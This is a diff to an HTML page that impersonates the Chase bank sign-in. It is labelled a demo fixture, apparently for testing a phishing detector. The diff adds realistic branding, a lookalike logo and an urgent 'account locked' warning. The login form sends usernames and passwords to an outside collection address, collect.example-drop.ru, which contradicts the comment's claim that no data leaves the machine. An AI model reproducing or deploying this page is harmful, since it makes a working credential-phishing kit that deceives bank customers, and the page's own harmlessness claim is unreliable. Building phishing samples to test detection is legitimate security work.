@@ -1,13 +1,53 @@
 <!doctype html>
-<!-- Demo fixture: lookalike bank login. Served as chase-secure-verify.com in tests. Harmless: the form posts nowhere real. -->
-<html><head><title>Chase Online - Sign in</title><meta property="og:site_name" content="Chase"></head>
-<body style="font-family:sans-serif;max-width:420px;margin:40px auto">
-<header><img alt="Chase logo" src="chase-logo.svg" width="120" height="30"></header>
-<h1>Sign in to Chase</h1>
-<p>Your account has been locked due to unusual activity. Verify your identity within 24 hours to avoid suspension.</p>
-<form id="login" action="https://collect.example-drop.ru/c.php" method="post">
-  <label for="u">Username</label><br><input id="u" name="username"><br>
-  <label for="p">Password</label><br><input id="p" name="password" type="password"><br><br>
-  <button>Sign in</button>
+<!-- DEMO FIXTURE — not a real site. Served locally as chase-secure-verify.com to show Sentinel
+     catching a bank-impersonation page. Submits nowhere; no data leaves this machine. -->
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Chase Online - Sign in</title>
+<meta property="og:site_name" content="Chase">
+<style>
+  * { box-sizing: border-box; margin: 0; }
+  body { font-family: "Open Sans", "Helvetica Neue", Arial, sans-serif; color: #121212; background: #fff; }
+  .bar { height: 64px; border-bottom: 1px solid #e6e8ea; display: flex; align-items: center; padding: 0 32px; }
+  .bar .mark { display: flex; align-items: center; gap: 12px; }
+  .bar .mark .word { font-weight: 800; font-size: 22px; letter-spacing: 1.5px; color: #117aca; }
+  .bar .help { margin-left: auto; font-size: 13px; color: #117aca; }
+  .wrap { max-width: 388px; margin: 40px auto; padding: 0 20px; }
+  h1 { font-size: 24px; font-weight: 400; color: #2b2b2b; margin-bottom: 20px; }
+  .alert { display: flex; gap: 10px; background: #fef6e7; border: 1px solid #f3d9a3; border-radius: 6px; padding: 12px 14px; font-size: 13px; color: #6b4e13; line-height: 1.45; margin-bottom: 24px; }
+  .alert .i { flex: none; width: 18px; height: 18px; border-radius: 50%; background: #e08700; color: #fff; font-weight: 700; font-size: 12px; display: grid; place-items: center; }
+  .field { position: relative; margin-bottom: 18px; }
+  .field label { position: absolute; left: 13px; top: 15px; color: #767676; font-size: 15px; transition: .15s; pointer-events: none; }
+  .field input { width: 100%; height: 52px; border: 1px solid #949494; border-radius: 4px; padding: 20px 13px 6px; font-size: 16px; background: #fff; }
+  .field input:focus { outline: 0; border: 2px solid #117aca; }
+  .field input:focus + label, .field input:not(:placeholder-shown) + label { top: 7px; font-size: 11px; color: #117aca; }
+  .remember { display: flex; align-items: center; gap: 9px; margin: 6px 0 22px; font-size: 14px; color: #2b2b2b; }
+  .remember input { width: 17px; height: 17px; accent-color: #117aca; }
+  button { width: 100%; height: 48px; background: #117aca; color: #fff; border: 0; border-radius: 24px; font-size: 16px; font-weight: 700; cursor: pointer; }
+  button:hover { background: #0d6cb4; }
+  .links { display: flex; flex-direction: column; gap: 14px; margin-top: 24px; font-size: 14px; }
+  .links a { color: #117aca; text-decoration: none; }
+  footer { max-width: 388px; margin: 36px auto 40px; font-size: 11px; color: #949494; line-height: 1.55; padding: 0 20px; }
+</style></head>
+<body>
+<div class="bar">
+  <div class="mark">
+    <svg width="36" height="36" viewBox="0 0 100 100" aria-hidden="true" fill="#117aca" fill-rule="evenodd">
+      <path d="M50 4 96 50 50 96 4 50Z M50 20 20 50 50 80 80 50Z"/>
+      <rect x="40" y="2" width="20" height="30"/><rect x="40" y="68" width="20" height="30"/>
+      <rect x="2" y="40" width="30" height="20"/><rect x="68" y="40" width="30" height="20"/>
+    </svg>
+    <span class="word">CHASE</span>
+  </div>
+  <span class="help">Español</span>
+</div>
+<form class="wrap" action="https://collect.example-drop.ru/c.php" method="post">
+  <h1>Sign in to chase.com</h1>
+  <div class="alert"><span class="i">!</span><span>For your security, your account has been temporarily locked due to unusual sign-in activity. Please verify your identity within 24 hours to avoid suspension.</span></div>
+  <div class="field"><input id="u" name="username" autocomplete="username" placeholder=" "><label for="u">Username</label></div>
+  <div class="field"><input id="p" name="password" type="password" autocomplete="current-password" placeholder=" "><label for="p">Password</label></div>
+  <label class="remember"><input type="checkbox"> Remember me</label>
+  <button type="submit">Sign in</button>
+  <div class="links"><a href="#">Forgot username/password?</a><a href="#">Not enrolled? Sign up now.</a></div>
 </form>
+<footer>Investing involves market risk, including possible loss of principal. JPMorgan Chase Bank, N.A. Member FDIC. Equal Housing Lender. &copy; 2026 JPMorgan Chase &amp; Co. This is a demonstration page.</footer>
 </body></html>
